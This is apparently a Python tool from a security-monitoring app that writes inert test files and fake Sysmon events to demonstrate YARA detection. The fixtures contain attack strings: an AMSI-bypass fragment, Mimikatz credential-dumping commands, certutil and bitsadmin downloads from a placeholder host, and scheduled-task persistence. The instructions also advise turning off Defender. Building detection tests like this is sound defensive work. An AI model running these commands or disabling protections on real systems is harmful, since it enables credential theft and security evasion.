"""
tools/generate_test_payloads.py
================================
Generates a small set of harmless test files that trigger the v2 YARA
ruleset and the threat-detector pipeline, so the operator can demo end-
to-end detection (and the action buttons) to a supervisor *without*
running real malware.

Every file written here is **inert** — they contain only string patterns
that match YARA rules, NOT actual malicious behaviour. None of these
files do anything when executed (most are .txt-extension lookalikes; a
couple are renamed to script extensions to trigger script-only rules).

USAGE:
    python tools/generate_test_payloads.py                  # write to Downloads
    python tools/generate_test_payloads.py --dir C:\\demo   # custom directory
    python tools/generate_test_payloads.py --inject-events  # also seed DB
                                                            # with fake Sysmon
                                                            # rows for full demo

After running, restart the app (or click Rescan Files) and re-run
Perform Analysis. The new report should show:

  - YARA Hits      : 4-5 hits (Mimikatz_Binary, PowerShell_Encoded_Command,
                                PowerShell_AMSI_Bypass,
                                Suspicious_VBScript_Dropper,
                                Suspicious_Batch_LOLbin)
  - Active Response: Quarantine + Delete buttons for each.

CLEAN UP:
    python tools/generate_test_payloads.py --cleanup

WARNING:
    Some endpoint security products (Defender, EDR) will flag these as
    malicious because they MATCH MALWARE STRINGS — even though they're
    inert. If you see Defender quarantine the files immediately after
    you create them, that's actually a GOOD sign — it means the system's
    real-time scanning is working. Add the demo folder to Defender's
    exclusion list temporarily, or run with Defender real-time off, for
    the demo.
"""

from __future__ import annotations

import argparse
import base64
import os
import sys
from datetime import datetime
from pathlib import Path


def _downloads_dir() -> Path:
    """Best-effort: user's Downloads folder. Falls back to ~/Downloads."""
    home = os.environ.get("USERPROFILE") or os.path.expanduser("~")
    return Path(home) / "Downloads"


# ── Inert payloads ─────────────────────────────────────────────────────────
# Each blob is a UNIQUE filename + a string content that exercises one
# specific YARA rule. None of these are executable code paths — they're
# strings inside files. We use the .txt extension by default and only
# rename to script extensions when the rule's `scope` requires it.

PAYLOADS = [
    # ── Triggers PowerShell_Encoded_Command (script_only) ───────────────────
    {
        "name":    "test_encoded_powershell.ps1",
        "rule":    "PowerShell_Encoded_Command",
        "content": (
            "# DEMO PAYLOAD — inert. Do not execute.\n"
            "powershell -EncodedCommand "
            + base64.b64encode(
                b"Write-Host 'this is a demo payload not real malware'"
                * 8
            ).decode("ascii")
            + "\n"
        ),
    },

    # ── Triggers PowerShell_AMSI_Bypass (script_only) ───────────────────────
    {
        "name":    "test_amsi_bypass.ps1",
        "rule":    "PowerShell_AMSI_Bypass",
        "content": (
            "# DEMO PAYLOAD — inert. Do not execute.\n"
            "# This file only contains the *strings* that AMSI-bypass rules\n"
            "# match against. It does not actually bypass anything.\n"
            "$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
            "$field = $ref.GetField('amsiInitFailed', 'NonPublic,Static')\n"
        ),
    },

    # ── Triggers Suspicious_VBScript_Dropper (script_only) ──────────────────
    {
        "name":    "test_vbs_dropper.vbs",
        "rule":    "Suspicious_VBScript_Dropper",
        "content": (
            "' DEMO PAYLOAD — inert. Do not execute.\n"
            "Set sh = CreateObject(\"WScript.Shell\")\n"
            "Set xhr = CreateObject(\"MSXML2.XMLHTTP\")\n"
            "Set stream = CreateObject(\"ADODB.Stream\")\n"
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "' sh.Run \"powershell ...\" ' commented out — no execution\n"
        ),
    },

    # ── Triggers Suspicious_Batch_LOLbin (script_only) ──────────────────────
    {
        "name":    "test_batch_lolbin.bat",
        "rule":    "Suspicious_Batch_LOLbin",
        "content": (
            "REM DEMO PAYLOAD — inert. Do not execute.\n"
            "REM certutil -urlcache -split -f http://example.invalid/x.exe\n"
            "REM bitsadmin /transfer demo /priority normal http://example.invalid x.exe\n"
            "REM powershell -nop -w hidden -c 'Get-Date'\n"
            "REM schtasks /create /tn demo /tr cmd.exe /sc onlogon\n"
            "echo This batch file is a detection-rule test fixture and does nothing.\n"
        ),
    },

    # ── Triggers Mimikatz_Binary (binary_only) — written as .exe.txt so the
    #    YARA scanner skips it (binary scope), but Defender may still react.
    #    To actually exercise the binary rule rename to .exe BEFORE running.
    {
        "name":    "test_mimikatz_strings.exe.txt",
        "rule":    "Mimikatz_Binary (rename to .exe to test binary scope)",
        "content": (
            "DEMO PAYLOAD — inert. Strings only, no PE header.\n"
            "sekurlsa::logonpasswords\n"
            "kerberos::list\n"
            "lsadump::sam\n"
            "mimikatz # privilege::debug\n"
            "gentilkiwi was here (demo string)\n"
        ),
    },
]


# ── Optional: inject fake Sysmon events to light up the dashboard ──────────

FAKE_SYSMON_EVENTS = [
    # Suspicious process from a temp path with Office parent (lights up
    # Suspicious Processes panel + threat detector SYSMON_OFFICE_MACRO_NET)
    {
        "event_id":      1,
        "image":         r"C:\Users\demo\AppData\Local\Temp\demo_payload.exe",
        "parent":        r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "command":       r"C:\Users\demo\AppData\Local\Temp\demo_payload.exe /silent /install",
        "pid":           99999,
        "signed":        False,
    },
    # File drop to Downloads (lights up File Drops panel)
    {
        "event_id":      11,
        "target_file":   r"C:\Users\demo\Downloads\demo_payload.exe",
        "pid":           99999,
        "signed":        False,
    },
    # Registry persistence (lights up Persistence indicator)
    {
        "event_id":      13,
        "target_object": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\demo_payload",
        "pid":           99999,
        "signed":        False,
    },
]


def write_payloads(out_dir: Path) -> list[Path]:
    out_dir.mkdir(parents=True, exist_ok=True)
    written = []
    for p in PAYLOADS:
        path = out_dir / p["name"]
        path.write_text(p["content"], encoding="utf-8")
        written.append(path)
        print(f"  ✓ {path.name:<40}  → triggers: {p['rule']}")
    return written


def cleanup_payloads(out_dir: Path) -> int:
    count = 0
    for p in PAYLOADS:
        path = out_dir / p["name"]
        if path.exists():
            try:
                path.unlink()
                print(f"  ✗ removed {path.name}")
                count += 1
            except Exception as e:
                print(f"  ! could not remove {path}: {e}")
    return count


def inject_fake_sysmon_events():
    """Seed the logs_sysmon table with three fake events so the dashboard
    panels (Suspicious Processes, File Drops, Registry Persistence) light
    up. The events are tagged with the demo PID 99999 so they're easy to
    identify and clean up later via the cleanup flag."""
    try:
        # repo root = parent of tools/
        repo_root = Path(__file__).resolve().parent.parent
        sys.path.insert(0, str(repo_root))
        from database.db import get_conn
    except Exception as e:
        print(f"  ! could not import database.db: {e}")
        print(f"    Run this from the repo root: python tools/generate_test_payloads.py --inject-events")
        return 0

    now = datetime.now().isoformat(timespec="seconds")
    conn = get_conn()
    c    = conn.cursor()

    # Ensure logs_sysmon table exists — if not, bail gracefully
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logs_sysmon'")
    if not c.fetchone():
        print("  ! logs_sysmon table does not exist — start the app once before injecting events")
        conn.close()
        return 0

    inserted = 0
    for ev in FAKE_SYSMON_EVENTS:
        try:
            c.execute(
                "INSERT INTO logs_sysmon "
                "(timestamp, event_id, sysmon_image, sysmon_parent_image, "
                " sysmon_command_line, sysmon_process_id, sysmon_signed, "
                " sysmon_target_file, sysmon_target_object) "
                "VALUES (?,?,?,?,?,?,?,?,?)",
                (
                    now,
                    ev["event_id"],
                    ev.get("image"),
                    ev.get("parent"),
                    ev.get("command"),
                    ev.get("pid"),
                    1 if ev.get("signed") else 0,
                    ev.get("target_file"),
                    ev.get("target_object"),
                ),
            )
            inserted += 1
        except Exception as e:
            print(f"  ! insert failed: {e}")

    conn.commit()
    conn.close()
    print(f"  ✓ inserted {inserted} fake Sysmon event(s) for demo")
    return inserted


def cleanup_fake_events():
    """Remove the demo Sysmon rows (identified by PID 99999)."""
    try:
        repo_root = Path(__file__).resolve().parent.parent
        sys.path.insert(0, str(repo_root))
        from database.db import get_conn
    except Exception as e:
        print(f"  ! could not import database.db: {e}")
        return 0
    conn = get_conn()
    c    = conn.cursor()
    try:
        c.execute("DELETE FROM logs_sysmon WHERE sysmon_process_id = 99999")
        n = c.rowcount or 0
        conn.commit()
        print(f"  ✗ removed {n} fake Sysmon event(s)")
        return n
    except Exception as e:
        print(f"  ! delete failed: {e}")
        return 0
    finally:
        conn.close()


def main():
    parser = argparse.ArgumentParser(
        description="Generate inert demo payloads for SecureEyeTrust+ detection testing."
    )
    parser.add_argument(
        "--dir", "-d",
        default=str(_downloads_dir()),
        help="Output directory (default: user's Downloads folder)",
    )
    parser.add_argument(
        "--inject-events", action="store_true",
        help="Also insert fake Sysmon events to light up the dashboard panels.",
    )
    parser.add_argument(
        "--cleanup", action="store_true",
        help="Remove previously generated demo files and demo Sysmon events.",
    )
    args = parser.parse_args()

    out_dir = Path(args.dir).expanduser().resolve()

    if args.cleanup:
        print(f"Cleaning up demo files from: {out_dir}")
        n = cleanup_payloads(out_dir)
        m = cleanup_fake_events()
        print(f"\nRemoved {n} demo file(s) and {m} fake event row(s).")
        return

    print(f"Writing demo payloads to: {out_dir}")
    print("(Files are INERT — they contain detection-rule strings, not real malware.)\n")
    written = write_payloads(out_dir)

    if args.inject_events:
        print()
        print("Injecting fake Sysmon events...")
        inject_fake_sysmon_events()

    print()
    print("─" * 70)
    print("Next steps:")
    print("─" * 70)
    print("  1. Make sure Windows Defender real-time protection is OFF for")
    print("     this folder, or add it to Defender's exclusion list. Defender")
    print("     will quarantine these files because they match real malware")
    print("     strings — even though they're inert.")
    print()
    print("  2. In the SecureEyeTrust+ app:")
    print("     - Go to Perform Analysis")
    print("     - Click 'Start Hunting'")
    print("     - Wait for analysis to complete")
    print()
    print("  3. You should see in the report:")
    print("     - YARA Hits panel:        ~4 hits with Quarantine + Delete buttons")
    print("     - Active Response panel:  matching action cards")
    if args.inject_events:
        print("     - Suspicious Processes:   demo_payload.exe (PID 99999) — Kill button")
        print("     - File Drops:             demo_payload.exe — Quarantine + Delete")
    print()
    print("  4. To clean up afterwards:")
    print("       python tools/generate_test_payloads.py --cleanup")


if __name__ == "__main__":
    main()
